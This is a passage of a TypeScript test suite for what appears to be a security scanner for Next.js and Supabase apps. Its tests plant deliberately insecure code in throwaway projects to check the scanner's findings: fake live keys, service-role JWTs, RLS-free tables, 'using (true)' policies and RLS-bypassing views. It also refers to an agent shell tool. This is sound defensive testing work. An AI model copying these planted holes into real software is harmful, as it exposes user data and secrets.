import { describe, expect, it } from "vitest";
import { mkdtempSync, mkdirSync, readdirSync, readFileSync, writeFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { randomBytes } from "node:crypto";
import { execFileSync } from "node:child_process";
import { scan } from "../src/core/scan.js";
import { DEFAULT_CONFIG } from "../src/core/config.js";
import { RULES } from "../src/rules/index.js";
import { redact } from "../src/rules/secrets/patterns.js";

const FIXTURES = resolve(__dirname, "../fixtures/apps");
const ids = (r: ReturnType<typeof scan>) => r.findings.map((f) => `${f.ruleId} ${f.file}:${f.line}`).sort();

/** Builds a throwaway project, so no key-shaped strings are committed for these tests. */
function project(files: Record<string, string>) {
  const root = mkdtempSync(join(tmpdir(), "seaworthy-"));
  for (const [p, c] of Object.entries(files)) {
    mkdirSync(dirname(join(root, p)), { recursive: true });
    writeFileSync(join(root, p), c);
  }
  return { root, done: () => rmSync(root, { recursive: true, force: true }) };
}
const rand = (n: number) => randomBytes(n * 2).toString("base64").replace(/[^A-Za-z0-9]/g, "").slice(0, n);
const jwt = (payload: object) =>
  [{ alg: "HS256", typ: "JWT" }, payload].map((o) => Buffer.from(JSON.stringify(o)).toString("base64url")).join(".") + "." + rand(43);

describe("notes-saas fixture", () => {
  const r = scan(join(FIXTURES, "notes-saas"), DEFAULT_CONFIG, RULES);

  it("finds exactly the planted secret and Supabase flaws", () => {
    expect(ids(r).filter((s) => /SW-(S0[1-3]|D0[12]|P0[12]|B01|A0[125])/.test(s))).toEqual([
      "SW-A01 app/api/notes/[id]/route.ts:21",
      "SW-A02 app/api/notes/[id]/route.ts:14",
      "SW-A05 app/api/search/route.ts:13",
      "SW-B01 next.config.js:2",
      "SW-D01 supabase/migrations/0001_init.sql:20",
      "SW-D02 supabase/migrations/0001_init.sql:18",
      "SW-P01 app/api/webhooks/stripe/route.ts:5",
      "SW-P02 app/api/checkout/route.ts:20",
      "SW-S01 .env:3",
      "SW-S01 .env:4",
      "SW-S01 .env:5",
      "SW-S01 .env:6",
      "SW-S01 lib/stripe.ts:3",
      "SW-S02 .env:1",
      "SW-S02 .gitignore:1",
      "SW-S03 .env:3",
      "SW-S03 lib/supabase-browser.ts:6",
    ]);
  });
  it("does not flag the public anon key (decoy)", () => {
    expect(r.findings.some((f) => f.file === ".env" && f.line === 2)).toBe(false);
  });
  it("detects the stack", () => {
    expect(r.stack.sort()).toEqual(["nextjs", "react", "stripe", "supabase"]);
  });
  it("fails the build", () => expect(r.failed).toBe(true));
});

describe("chat-agent fixture", () => {
  const r = scan(join(FIXTURES, "chat-agent"), DEFAULT_CONFIG, RULES);
  it("finds the plain-text GitHub token and DB password in the MCP config", () => {
    expect(ids(r).filter((s) => s.startsWith("SW-S01"))).toEqual([
      "SW-S01 .cursor/mcp.json:11",
      "SW-S01 .cursor/mcp.json:5",
    ]);
  });
  it("finds the OpenAI key read from a public variable and the browser flag", () => {
    expect(ids(r).filter((s) => s.startsWith("SW-S04"))).toEqual([
      "SW-S04 lib/openai-browser.ts:4",
      "SW-S04 lib/openai-browser.ts:5",
    ]);
  });
  it("reports the missing headers on the next dependency, as there is no next.config", () => {
    expect(ids(r).filter((s) => s.startsWith("SW-B01"))).toEqual(["SW-B01 package.json:12"]);
  });
  it("finds the persona in the system prompt and the model output rendered as HTML", () => {
    expect(ids(r).filter((s) => /^SW-L0[12]/.test(s))).toEqual(["SW-L01 app/api/assistant/route.ts:40", "SW-L02 app/chat/page.tsx:25"]);
  });
  it("does not flag the chat page's fixed system prompt (decoy)", () => {
    expect(r.findings.some((f) => f.ruleId === "SW-L01" && f.file === "app/chat/page.tsx")).toBe(false);
  });
  it("finds the shell tool and the MCP config problems", () => {
    expect(ids(r).filter((s) => /^SW-L0[34]/.test(s))).toEqual([
      "SW-L03 app/api/assistant/route.ts:19",
      "SW-L03 app/api/assistant/route.ts:50",
      "SW-L04 .cursor/mcp.json:11",
      "SW-L04 .cursor/mcp.json:15",
      "SW-L04 .cursor/mcp.json:5",
    ]);
  });
  it("finds the wildcard CORS and the missing rate limit on the assistant route", () => {
    expect(ids(r).filter((s) => /^SW-A0[34]/.test(s))).toEqual(["SW-A03 app/api/assistant/route.ts:34", "SW-A04 app/api/assistant/route.ts:10"]);
  });
  it("finds the unauthenticated assistant route and nothing else", () => {
    expect(ids(r).filter((s) => s.startsWith("SW-A01"))).toEqual(["SW-A01 app/api/assistant/route.ts:34"]);
  });
  it("finds the open Firestore and Storage rules", () => {
    expect(ids(r).filter((s) => /^SW-D0[34]/.test(s))).toEqual(["SW-D03 firestore.rules:5", "SW-D04 storage.rules:5"]);
  });
  it("does not flag the server-side OpenAI key (decoy)", () => {
    expect(r.findings.some((f) => f.file === "app/api/assistant/route.ts" && /^SW-S0/.test(f.ruleId))).toBe(false);
  });
  it("does not flag its .gitignore, which lists .env (decoy)", () => {
    expect(r.findings.some((f) => f.ruleId === "SW-S02")).toBe(false);
  });
  it("does not flag the Firebase web config key (decoy)", () => {
    expect(r.findings.some((f) => f.file === "lib/firebase.ts")).toBe(false);
  });
});

describe("SW-S01 committed secrets", () => {
  it("vulnerable: flags real-looking keys", () => {
    const p = project({
      "a.ts": `const k = "sk_live_51${rand(60)}";\nconst g = "ghp_${rand(36)}";`,
      "b.env": `SUPABASE_KEY=${jwt({ role: "service_role", iss: "supabase" })}`,
    });
    const r = scan(p.root, DEFAULT_CONFIG, RULES);
    p.done();
    expect(ids(r)).toEqual(["SW-S01 a.ts:1", "SW-S01 a.ts:2", "SW-S01 b.env:1"]);
    expect(r.findings.find((f) => f.file === "b.env")?.title).toBe("Supabase service-role key committed");
  });
  it("fixed: env vars, placeholders, anon keys and local DB URLs are fine", () => {
    const p = project({
      "a.ts": `const stripe = new Stripe(process.env.STRIPE_SECRET_KEY!);`,
      ".env.example": `STRIPE_SECRET_KEY=sk_live_xxxxxxxxxxxxxxxxxxxxxxxx\nGITHUB=ghp_${"0".repeat(36)}`,
      "c.ts": `const anon = "${jwt({ role: "anon", iss: "supabase" })}";`,
      "docker.env": `DATABASE_URL=postgres://postgres:${rand(16)}@localhost:5432/app`,
    });
    const r = scan(p.root, DEFAULT_CONFIG, RULES);
    p.done();
    expect(r.findings).toEqual([]);
  });
  it("respects .gitignore: an ignored .env is not committed, so not a finding", () => {
    const p = project({ ".gitignore": ".env\n", ".env": `K=sk_live_51${rand(60)}` });
    const r = scan(p.root, DEFAULT_CONFIG, RULES);
    p.done();
    expect(r.findings).toEqual([]);
  });
  it("honours seaworthy-ignore only with a reason", () => {
    const key = `sk_live_51${rand(60)}`;
    const p = project({
      "a.ts": `// seaworthy-ignore SW-S01 revoked test key, kept for docs\nconst a = "${key}";\n// seaworthy-ignore SW-S01\nconst b = "${key}";`,
    });
    const r = scan(p.root, DEFAULT_CONFIG, RULES);
    p.done();
    expect(ids(r)).toEqual(["SW-S01 a.ts:4"]);
    expect(r.suppressed).toHaveLength(1);
    expect(r.missingReason).toHaveLength(1);
  });
});

describe("SW-D01 table without RLS", () => {
  const supa = { "package.json": JSON.stringify({ dependencies: { "@supabase/supabase-js": "2.0.0" } }) };
  const run = (files: Record<string, string>) => {
    const p = project({ ...supa, ...files });
    const r = scan(p.root, DEFAULT_CONFIG, RULES);
    p.done();
    return ids(r);
  };

  it("vulnerable: flags a public table with no RLS", () => {
    expect(run({ "supabase/migrations/1_init.sql": "-- init\ncreate table posts (id int);" })).toEqual([
      "SW-D01 supabase/migrations/1_init.sql:2",
    ]);
  });
  it("fixed: RLS enabled in a later migration counts", () => {
    expect(
      run({
        "supabase/migrations/1_init.sql": "create table public.posts (id int);",
        "supabase/migrations/2_rls.sql": "ALTER TABLE ONLY \"public\".\"posts\" ENABLE ROW LEVEL SECURITY;",
      }),
    ).toEqual([]);
  });
  it("fixed: RLS enabled inside a DO block counts", () => {
    expect(
      run({
        "supabase/migrations/1.sql": "create table posts (id int);\ndo $$ begin\n  alter table posts enable row level security;\nend $$;",
      }),
    ).toEqual([]);
  });
  it("ignores private schemas, temp tables, dropped tables and API-revoked tables", () => {
    expect(
      run({
        "supabase/migrations/1.sql": [
          "create table private.secrets (id int);",
          "create temp table scratch (id int);",
          "create table old (id int); drop table old;",
          "create table internal (id int); revoke all on table internal from anon, authenticated;",
        ].join("\n"),
      }),
    ).toEqual([]);
  });
  it("is not fooled by SQL inside strings, comments or function bodies", () => {
    expect(
      run({
        "supabase/migrations/1.sql": [
          "create table t (id int);",
          "-- alter table t enable row level security;",
          "select 'alter table t enable row level security;';",
          "create function f() returns void as $fn$ alter table t enable row level security; $fn$ language sql;",
        ].join("\n"),
      }),
    ).toEqual(["SW-D01 supabase/migrations/1.sql:1"]);
  });
  it("re-flags a table whose RLS was disabled later", () => {
    expect(
      run({
        "supabase/migrations/1.sql": "create table t (id int); alter table t enable row level security;",
        "supabase/migrations/2.sql": "alter table t disable row level security;",
      }),
    ).toEqual(["SW-D01 supabase/migrations/1.sql:1"]);
  });
  it("does not run on projects without Supabase", () => {
    const p = project({ "supabase-free/migrations/1.sql": "create table t (id int);" });
    const r = scan(p.root, DEFAULT_CONFIG, RULES);
    p.done();
    expect(r.rulesRun).not.toContain("SW-D01");
  });
});

describe("SW-D02 policy that allows everyone", () => {
  const supa = { "package.json": JSON.stringify({ dependencies: { "@supabase/supabase-js": "2.0.0" } }) };
  /** Every SW-D02 finding at any confidence, as "line confidence". */
  const run = (sql: string | Record<string, string>) => {
    const files = typeof sql === "string" ? { "supabase/migrations/1.sql": sql } : sql;
    const p = project({ ...supa, ...files });
    const all = scan(p.root, { ...DEFAULT_CONFIG, minConfidence: "low" }, RULES);
    const shown = scan(p.root, DEFAULT_CONFIG, RULES);
    p.done();
    const d02 = (r: ReturnType<typeof scan>) => r.findings.filter((f) => f.ruleId === "SW-D02");
    return {
      all: d02(all).map((f) => `${f.line} ${f.confidence}`),
      shown: d02(shown).map((f) => `${f.line} ${f.confidence}`),
      titles: d02(all).map((f) => f.title),
      suppressed: all.suppressed.filter((f) => f.ruleId === "SW-D02").length,
    };
  };
  const owned =
    "create table notes (id uuid primary key, user_id uuid references auth.users, body text);\n" +
    "alter table notes enable row level security;\n";
  const unowned =
    "create table products (id int primary key, name text);\n" + "alter table products enable row level security;\n";

  it("vulnerable: anyone can read every row of a table that belongs to users", () => {
    const r = run(owned + "create policy read_all on notes\n  for select using (true);");
    expect(r.all).toEqual(["4 high"]);
    expect(r.titles[0]).toBe("Policy on public.notes lets anyone read every row");
  });
  it("fixed: a policy scoped to the owner is not flagged, with or without the subquery wrapper", () => {
    expect(run(owned + "create policy own on notes for select using (auth.uid() = user_id);").all).toEqual([]);
    expect(run(owned + "create policy own on notes for select using ((select auth.uid()) = user_id);").all).toEqual([]);
  });
  it("a public read on a table with no owner column is medium confidence, hidden by default", () => {
    const r = run(unowned + "create policy catalogue on products for select using (true);");
    expect(r.all).toEqual(["3 medium"]);
    expect(r.shown).toEqual([]);
  });
  it("checking only that someone is logged in counts as open, on owned tables", () => {
    expect(run(owned + "create policy p on notes for select using (auth.uid() is not null);").titles).toEqual([
      "Policy on public.notes lets any signed-in user read every row",
    ]);
    expect(run(owned + "create policy p on notes for select to authenticated using (true);").all).toEqual(["3 high"]);
    // Logged-in users reading shared, unowned data is normal.
    expect(run(unowned + "create policy p on products for select to authenticated using (true);").all).toEqual([]);
  });
  it("ignores restrictive policies and policies for service_role or custom roles", () => {
    expect(run(owned + "create policy p on notes as restrictive for select using (true);").all).toEqual([]);
    expect(run(owned + "create policy p on notes for all to service_role using (true);").all).toEqual([]);
    expect(run(owned + 'create policy p on notes for select to "Reporting Role" using (true);').all).toEqual([]);
  });
  it("vulnerable: open writes", () => {
    expect(run(owned + "create policy p on notes for update using (true);").titles).toEqual([
      "Policy on public.notes lets anyone change every row",
    ]);
    expect(run(unowned + "create policy p on products for delete using (true);").all).toEqual(["3 high"]);
    expect(run(owned + "create policy p on notes for insert\n  with check (true);").all).toEqual(["4 high"]);
    // An open insert with no owner column (a waitlist) is often deliberate.
    expect(run(unowned + "create policy p on products for insert with check (true);").all).toEqual(["3 medium"]);
  });
  it("vulnerable: an update scoped by USING but open in WITH CHECK lets rows be handed to anyone", () => {
    const r = run(owned + "create policy p on notes for update\n  using (auth.uid() = user_id)\n  with check (true);");
    expect(r.all).toEqual(["5 high"]);
    expect(r.titles[0]).toContain("handing them to another user");
  });
  it("follows later migrations: dropped and altered policies, renamed tables, added owner columns", () => {
    const open = "create policy p on notes for select using (true);";
    const two = (second: string) => ({ "supabase/migrations/1.sql": owned + open, "supabase/migrations/2.sql": second });
    expect(run(two("drop policy if exists p on notes;")).all).toEqual([]);
    expect(run(two("alter policy p on notes using (auth.uid() = user_id);")).all).toEqual([]);
    expect(run(two("alter table notes rename to memos;")).titles).toEqual([
      "Policy on public.memos lets anyone read every row",
    ]);
    expect(
      run({
        "supabase/migrations/1.sql": unowned + "create policy p on products for select using (true);",
        "supabase/migrations/2.sql": "alter table products add column owner_id uuid;",
      }).all,
    ).toEqual(["3 high"]);
  });
  it("finds owners declared as a table-level foreign key", () => {
    const sql =
      "create table docs (id int, author uuid, foreign key (author) references auth.users (id));\n" +
      "alter table docs enable row level security;\ncreate policy p on docs for select using (true);";
    expect(run(sql).all).toEqual(["3 high"]);
  });
  it("leaves tables without RLS to SW-D01", () => {
    expect(run("create table t (user_id uuid);\ncreate policy p on t for select using (true);").all).toEqual([]);
  });
  it("is not fooled by policy names, comments, strings or subqueries", () => {
    expect(run(owned + 'create policy "using (true)" on notes for select using (auth.uid() = user_id);').all).toEqual([]);
    expect(run(owned + "-- create policy p on notes for select using (true);\nselect 1;").all).toEqual([]);
    expect(run(owned + "create policy p on notes for select using (body = 'true');").all).toEqual([]);
    expect(
      run(owned + "create policy p on notes for select using (exists (select 1 from members m where m.user_id = auth.uid()));")
        .all,
    ).toEqual([]);
    expect(
      run(owned + "create policy p on notes for select using (true /* for now */ and auth.uid() = user_id);").all,
    ).toEqual([]);
  });
  it("points at the expression, also inside DO blocks and across lines", () => {
    expect(run(owned + "do $$ begin\n  create policy p on notes for select using (true);\nend $$;").all).toEqual([
      "4 high",
    ]);
    expect(run(owned + "create policy p on notes for select using (\n\n  true\n);").all).toEqual(["5 high"]);
  });
  it("honours a seaworthy-ignore comment with a reason", () => {
    const r = run(
      unowned + "create policy p on products for select\n  -- seaworthy-ignore SW-D02 public product catalogue\n  using (true);",
    );
    expect(r.all).toEqual([]);
    expect(r.suppressed).toBe(1);
  });
});

describe("SW-D02 on `supabase db dump` output", () => {
  it("reads quoted names, quoted roles and foreign keys added after the table", () => {
    const sql = [
      'CREATE TABLE IF NOT EXISTS "public"."invoices" (',
      '    "id" bigint NOT NULL,',
      '    "customer" "uuid" NOT NULL',
      ");",
      'ALTER TABLE ONLY "public"."invoices"',
      '    ADD CONSTRAINT "invoices_customer_fkey" FOREIGN KEY ("customer") REFERENCES "auth"."users"("id");',
      'CREATE POLICY "Authenticated can read invoices" ON "public"."invoices" FOR SELECT TO "authenticated" USING (true);',
      'ALTER TABLE "public"."invoices" ENABLE ROW LEVEL SECURITY;',
    ].join("\n");
    const p = project({
      "package.json": JSON.stringify({ dependencies: { "@supabase/supabase-js": "2.0.0" } }),
      "supabase/migrations/20240101000000_remote_schema.sql": sql,
    });
    const r = scan(p.root, DEFAULT_CONFIG, RULES);
    p.done();
    expect(r.findings.map((f) => `${f.ruleId} ${f.line} ${f.confidence} ${f.title}`)).toEqual([
      "SW-D02 7 high Policy on public.invoices lets any signed-in user read every row",
    ]);
  });
});

describe("SW-D05 view or security definer function that bypasses RLS", () => {
  const D05 = resolve(__dirname, "../fixtures/rules/sw-d05");
  const d05 = (r: ReturnType<typeof scan>) => r.findings.filter((f) => f.ruleId === "SW-D05");
  /** Every SW-D05 finding at any confidence, as "file:line confidence". */
  const atAnyConfidence = (root: string) => {
    const r = scan(root, { ...DEFAULT_CONFIG, minConfidence: "low" }, RULES);
    return {
      all: d05(r).map((f) => `${f.file}:${f.line} ${f.confidence}`),
      findings: d05(r),
      suppressed: r.suppressed.filter((f) => f.ruleId === "SW-D05").map((f) => `${f.file}:${f.line}`),
    };
  };
  const supa = { "package.json": JSON.stringify({ dependencies: { "@supabase/supabase-js": "2.0.0" } }) };
  /** SW-D05 lines for one migration file (or several), at any confidence. */
  const run = (sql: string | Record<string, string>) => {
    const files = typeof sql === "string" ? { "supabase/migrations/1.sql": sql } : sql;
    const p = project({ ...supa, ...files });
    const r = atAnyConfidence(p.root);
    p.done();
    return r.all.map((s) => s.replace(/^supabase\/migrations\//, ""));
  };
  const notes =
    "create table notes (id int, user_id uuid, body text);\nalter table notes enable row level security;\n";

  it("vulnerable fixture: flags the view over an RLS table and the definer function with no search_path", () => {
    const r = atAnyConfidence(join(D05, "vulnerable"));
    const file = "supabase/migrations/20260101000000_notes.sql";
    expect(r.all).toEqual([`${file}:10 high`, `${file}:14 medium`]);
    const [view, fn] = r.findings;
    expect(view!.title).toBe("View public.note_previews bypasses row-level security on public.notes");
    expect(view!.severity).toBe("high");
    expect(view!.fix).toContain("alter view public.note_previews set (security_invoker = true);");
    expect(view!.fixPrompt).toContain("public.note_previews");
    expect(fn!.title).toBe("Function public.note_count runs as its owner (security definer) with no search_path");
    expect(fn!.fix).toContain("set search_path = ''");
    expect(fn!.fixPrompt).toContain("public.note_count");
  });
  it("vulnerable fixture: the function finding is medium confidence, so hidden by default", () => {
    const r = scan(join(D05, "vulnerable"), DEFAULT_CONFIG, RULES);
    expect(d05(r).map((f) => f.line)).toEqual([10]);
  });
  it("fixed fixture: security_invoker view, and a function with search_path set and execute revoked", () => {
    expect(atAnyConfidence(join(D05, "fixed")).all).toEqual([]);
  });
  it("decoy fixture: nothing flagged, and the seaworthy-ignore comment is honoured", () => {
    const r = atAnyConfidence(join(D05, "decoy"));
    expect(r.all).toEqual([]);
    expect(r.suppressed).toEqual(["supabase/migrations/20260101000000_init.sql:38"]);
  });

  it("decoy: a view over a table with no RLS is SW-D01's finding", () => {
    expect(run("create table tags (id int);\ncreate view tag_list as select * from tags;")).toEqual([]);
  });
  it("decoy: a view fixed by a later alter view, in any boolean spelling", () => {
    const view = notes + "create view v as select * from notes;";
    expect(run({ "supabase/migrations/1.sql": view, "supabase/migrations/2.sql": "alter view v set (security_invoker = true);" })).toEqual([]);
    expect(run(view + "\nALTER VIEW IF EXISTS public.v SET (security_invoker=on);")).toEqual([]);
    expect(run(view + "\nalter view v set (security_invoker);")).toEqual([]);
  });
  it("decoy: trigger functions, revoked functions, dropped views and other schemas", () => {
    expect(run("create function t() returns trigger language plpgsql security definer as $$ begin return new; end $$;")).toEqual([]);
    expect(
      run("create function f() returns void language sql security definer as 'select 1';\nrevoke all on function f from public, anon, authenticated;"),
    ).toEqual([]);
    expect(run(notes + "create view v as select * from notes;\ndrop view v;")).toEqual([]);
    expect(run(notes + "create view private.v as select * from notes;")).toEqual([]);
    expect(run("create function private.f() returns void language sql security definer as 'select 1';")).toEqual([]);
  });
  it("decoy: seaworthy-ignore with a reason", () => {
    expect(run(notes + "-- seaworthy-ignore SW-D05 aggregate counts only\ncreate view v as select count(*) from notes;")).toEqual([]);
  });

  it("fixed: security_invoker in the with clause, quoted or in upper case", () => {
    expect(run(notes + "create view v with (security_invoker = true) as select * from notes;")).toEqual([]);
    expect(run(notes + "CREATE VIEW \"public\".\"v\" WITH (security_barrier, SECURITY_INVOKER = 'true') AS SELECT * FROM \"public\".\"notes\";")).toEqual([]);
  });
  it("vulnerable: security_invoker = false, joins, comma lists and multi-line views", () => {
    expect(run(notes + "create view v with (security_invoker = false) as select * from notes;")).toEqual(["1.sql:3 high"]);
    expect(run(notes + "create table tags (id int);\ncreate view v as\n  select * from tags t\n  join notes n on n.id = t.id;")).toEqual(["1.sql:4 high"]);
    expect(run(notes + "create table tags (id int);\ncreate or replace view v as select * from tags t, notes n;")).toEqual(["1.sql:4 high"]);
  });
  it("names every RLS table a view reads, including in subqueries, and RLS turned on in a later migration counts", () => {
    const p = project({
      ...supa,
      "supabase/migrations/1.sql":
        notes + "create table orders (id int);\ncreate view v as select * from orders o where o.id in (select id from notes);",
      "supabase/migrations/2.sql": "alter table orders enable row level security;",
    });
    const r = atAnyConfidence(p.root);
    p.done();
    expect(r.findings.map((f) => f.title)).toEqual(["View public.v bypasses row-level security on public.orders and public.notes"]);
    expect(r.findings[0]!.why).toContain("which have row-level security");
  });
  it("does not flag materialized views or temporary views (out of scope)", () => {
    expect(run(notes + "create materialized view mv as select * from notes;\ncreate temp view tv as select * from notes;")).toEqual([]);
  });
  it("create or replace view without the option undoes an earlier alter view", () => {
    const sql = notes + "create view v as select * from notes;\nalter view v set (security_invoker = true);\ncreate or replace view v as select id from notes;";
    expect(run(sql)).toEqual(["1.sql:5 high"]);
  });
  it("is not fooled by table names in strings or comments", () => {
    expect(run(notes + "create view v as select 'from notes' as label /* from notes */;")).toEqual([]);
  });
  it("a view the API roles can't read is not flagged", () => {
    expect(run(notes + "create view v as select * from notes;\nrevoke all on v from anon, authenticated;")).toEqual([]);
  });

  it("vulnerable: revoking only from anon and authenticated leaves the default PUBLIC grant", () => {
    const fn = "create function f() returns void language sql security definer as 'select 1';\n";
    expect(run(fn + "revoke execute on function f() from anon, authenticated;")).toEqual(["1.sql:1 medium"]);
    expect(run(fn + "revoke execute on function f() from public, anon, authenticated;\ngrant execute on function f() to anon;")).toEqual([
      "1.sql:1 medium",
    ]);
  });
  it("fixed: a later alter function set search_path, security invoker, or revoking execute on all functions", () => {
    const fn = "create function public.f(a int, b numeric(10, 2)) returns void language sql security definer as 'select 1';\n";
    expect(run(fn + "alter function public.f(int, numeric) set search_path = '';")).toEqual([]);
    expect(run(fn + "alter function f security invoker;")).toEqual([]);
    expect(run(fn + "revoke execute on all functions in schema public from public, anon, authenticated;")).toEqual([]);
    expect(
      run("alter default privileges in schema public revoke execute on functions from public, anon, authenticated;\n" + fn),
    ).toEqual([]);
  });
  it("reads `supabase db dump` output: quoted trigger return type, search_path and view options", () => {
    const sql = [
      'CREATE TABLE IF NOT EXISTS "public"."notes" ("id" bigint NOT NULL, "user_id" "uuid" NOT NULL);',
      'ALTER TABLE "public"."notes" ENABLE ROW LEVEL SECURITY;',
      'CREATE OR REPLACE FUNCTION "public"."handle_new_user"() RETURNS "trigger"',
      '    LANGUAGE "plpgsql" SECURITY DEFINER',
      "    AS $$ begin return new; end; $$;",
      'CREATE OR REPLACE FUNCTION "public"."count_notes"() RETURNS bigint',
      '    LANGUAGE "sql" SECURITY DEFINER',
      "    SET \"search_path\" TO ''",
      "    AS $$ select count(*) from public.notes; $$;",
      'CREATE OR REPLACE VIEW "public"."safe_notes" WITH ("security_invoker"=\'on\') AS',
      ' SELECT "notes"."id"',
      '   FROM "public"."notes";',
      'CREATE OR REPLACE VIEW "public"."off_notes" WITH ("security_invoker"=\'off\') AS',
      ' SELECT "notes"."id"',
      '   FROM "public"."notes";',
    ].join("\n");
    expect(run({ "supabase/migrations/20240101000000_remote_schema.sql": sql })).toEqual(["20240101000000_remote_schema.sql:13 high"]);
  });
  it("follows renamed views and functions, and alter function reset search_path", () => {
    expect(run(notes + "create view v as select * from notes;\nalter view v rename to w;\nalter view w set (security_invoker = on);")).toEqual([]);
    const fn = "create function f() returns void language sql security definer set search_path = '' as 'select 1';\n";
    expect(run(fn + "alter function f() rename to g;\nalter function g() reset search_path;")).toEqual(["1.sql:1 medium"]);
  });
  it("finds functions inside DO blocks and across lines, and ignores security definer in the body", () => {
    expect(run("do $$ begin\n  create function f() returns int language sql security definer as 'select 1';\nend $$;")).toEqual(["1.sql:2 medium"]);
    expect(run("create function f()\n  returns int\n  language plpgsql\n  security definer\nas $$ begin return 1; end $$;")).toEqual([
      "1.sql:1 medium",
    ]);
    expect(run("create function f() returns text language sql as $$ select 'security definer' $$;")).toEqual([]);
  });
});

describe("SW-S02 .env committed or not git-ignored", () => {
  /** Every finding for one rule at any confidence, as "file:line confidence". */
  const run = (files: Record<string, string>, rule = "SW-S02", setup?: (root: string) => void) => {
    const p = project(files);
    setup?.(p.root);
    const all = scan(p.root, { ...DEFAULT_CONFIG, minConfidence: "low" }, RULES);
    p.done();
    const mine = all.findings.filter((f) => f.ruleId === rule);
    return { all: mine.map((f) => `${f.file}:${f.line} ${f.confidence}`).sort(), titles: mine.map((f) => f.title) };
  };
  const secretEnv = `NEXT_PUBLIC_SITE_URL=https://example.org\nSTRIPE_SECRET_KEY=sk_test_${rand(24)}\n`;

  it("vulnerable: a .env with secrets that .gitignore doesn't cover", () => {
    expect(run({ ".env": secretEnv, ".gitignore": "node_modules\n.next\n" }).all).toEqual([
      ".env:1 high",
      ".gitignore:1 high",
    ]);
  });
  it("fixed: .gitignore covers it", () => {
    expect(run({ ".env": secretEnv, ".gitignore": "node_modules\n.env*\n!.env.example\n" }).all).toEqual([]);
  });
  it("with no .gitignore at all, reports the .env file only", () => {
    expect(run({ ".env.local": secretEnv }).all).toEqual([".env.local:1 high"]);
  });
  it("a .env with only public values is medium confidence", () => {
    expect(run({ ".env": "NEXT_PUBLIC_SITE_URL=https://example.org\n" }).all).toEqual([".env:1 medium"]);
  });
  it("ignores empty .env files, name-only files and templates", () => {
    expect(run({ ".env": "# fill me in\nSTRIPE_SECRET_KEY=\n", ".gitignore": ".env.local\n" }).all).toEqual([
      ".gitignore:1 medium", // advice: the first real .env would be committed
    ]);
    expect(run({ ".env.example": secretEnv, ".gitignore": ".env*\n!.env.example\n" }).all).toEqual([]);
  });
  it("a Python virtualenv folder called .env is not a .env file", () => {
    expect(run({ ".env/bin/activate": "export PATH=/x\n", ".gitignore": ".env/\n" }).all).toEqual([]);
  });
  it("finds a .env that git still tracks after it was added to .gitignore", () => {
    const r = run({ ".env": secretEnv, ".gitignore": ".env\n" }, "SW-S02", (root) => {
      execFileSync("git", ["init", "-q"], { cwd: root });
      execFileSync("git", ["add", "-f", ".env"], { cwd: root });
    });
    expect(r.all).toEqual([".env:1 high"]);
    expect(r.titles).toEqual([".env is committed"]);
  });
  it("respects the config's ignore patterns for git-tracked files", () => {
    const p = project({ "fixtures/app/.env": secretEnv, ".gitignore": ".env\n" });
    execFileSync("git", ["init", "-q"], { cwd: p.root });
    execFileSync("git", ["add", "-f", "fixtures/app/.env"], { cwd: p.root });
    const r = scan(p.root, { ...DEFAULT_CONFIG, minConfidence: "low", ignore: ["fixtures/**"] }, RULES);
    p.done();
    expect(r.findings.filter((f) => f.ruleId === "SW-S02")).toEqual([]);
  });
});

describe("SW-S03 secret exposed to the browser", () => {
  const run = (files: Record<string, string>) => {
    const p = project(files);
    const all = scan(p.root, { ...DEFAULT_CONFIG, minConfidence: "low" }, RULES);
    p.done();
    const mine = all.findings.filter((f) => f.ruleId === "SW-S03");
    return { all: mine.map((f) => `${f.file}:${f.line} ${f.confidence}`).sort(), titles: mine.map((f) => f.title) };
  };
  const ref = "https://abcdefghijklmnopqrst.supabase.co";
  const serviceRole = () => jwt({ iss: "supabase", ref: "abcdefghijklmnopqrst", role: "service_role" });
  const anon = () => jwt({ iss: "supabase", ref: "abcdefghijklmnopqrst", role: "anon" });

  it("vulnerable: a service-role key with a public prefix in a .env file", () => {
    const r = run({ ".env.local": `NEXT_PUBLIC_SUPABASE_URL=${ref}\nNEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY=${serviceRole()}\n` });
    expect(r.all).toEqual([".env.local:2 high"]);
    expect(r.titles).toEqual(["Public variable NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY holds a Supabase service-role key"]);
  });
  it("judges values as well as names", () => {
    const r = run({ ".env": `VITE_PAYMENTS=sk_live_${rand(30)}\nVITE_CONFIG=${serviceRole()}\n` });
    expect(r.all).toEqual([".env:1 high", ".env:2 high"]);
    expect(r.titles[0]).toBe("Public variable VITE_PAYMENTS holds a live secret key (Stripe or Clerk)");
  });
  it("fixed: public-by-design values and server-only names are fine", () => {
    expect(
      run({
        ".env": [
          `NEXT_PUBLIC_SUPABASE_ANON_KEY=${anon()}`,
          `NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY=pk_live_${rand(30)}`,
          `NEXT_PUBLIC_RECAPTCHA_SITE_KEY=${rand(40)}`,
          `SUPABASE_SERVICE_ROLE_KEY=${serviceRole()}`,
          `NEXT_PUBLIC_SECRET_SANTA_URL=`,
        ].join("\n"),
      }).all,
    ).toEqual([]);
  });
  it("checks git-ignored .env files too, because the build still bundles them", () => {
    expect(
      run({ ".gitignore": ".env*\n", ".env.local": `NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY=${serviceRole()}\n` }).all,
    ).toEqual([".env.local:1 high"]);
  });
  it("leaves LLM provider keys to SW-S04", () => {
    expect(run({ ".env": `NEXT_PUBLIC_OPENAI_API_KEY=sk-proj-${rand(48)}\n` }).all).toEqual([]);
  });
  it("vulnerable: code reading a public-prefixed secret", () => {
    const r = run({
      "lib/supabase-browser.ts":
        'import { createClient } from "@supabase/supabase-js";\n' +
        "export const supabase = createClient(\n  process.env.NEXT_PUBLIC_SUPABASE_URL!,\n" +
        "  process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY!,\n);\n",
      "src/admin.ts": "const k = import.meta.env.VITE_ADMIN_SECRET;\nconst j = import.meta.env.VITE_ADMIN_SECRET;\n",
      "src/routes/+page.svelte": "<script>\n  import { PUBLIC_DB_PASSWORD, PUBLIC_SITE } from '$env/static/public';\n</script>\n",
      "app/pay.tsx": '"use client";\nconst s = process.env["NEXT_PUBLIC_STRIPE_SECRET"];\n',
    });
    expect(r.all).toEqual([
      "app/pay.tsx:2 high",
      "lib/supabase-browser.ts:4 high",
      "src/admin.ts:1 high", // reported once per file, not per use
      "src/routes/+page.svelte:2 high",
